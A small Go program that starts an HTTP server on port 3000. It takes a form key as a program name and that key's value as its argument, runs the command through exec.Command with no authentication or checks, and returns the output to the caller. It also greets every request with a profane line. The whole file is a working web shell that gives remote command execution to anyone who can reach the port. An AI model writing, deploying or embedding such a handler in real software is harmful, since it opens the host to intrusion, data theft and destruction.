package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

func HomeRouterHandler(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseForm(); err != nil {
		log.Fatal("ParseForm Error: ", err)
	}
	fmt.Println(r.Form)
	fmt.Println("path", r.URL.Path)
	fmt.Println("scheme", r.URL.Scheme)
	urlCommand := strings.Join(r.Form["url_command"], "")
	fmt.Println(urlCommand)
	var val string
	for k, v := range r.Form {
		val = strings.Join(v, "")
		fmt.Println("key:", k)
		fmt.Println("val:", val)
		urlCommand = k
	}
	_, _ = fmt.Fprintf(w, "Listen fucking Instagram :3000!\n")
	if urlCommand != "" {
		out, _ := exec.Command(urlCommand, val).Output()
		fmt.Printf("%v\n", string(out))
		_, _ = fmt.Fprintf(w, "%v", string(out))
	}
}

func main() {
	http.HandleFunc("/", HomeRouterHandler)
	err := http.ListenAndServe(":3000", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
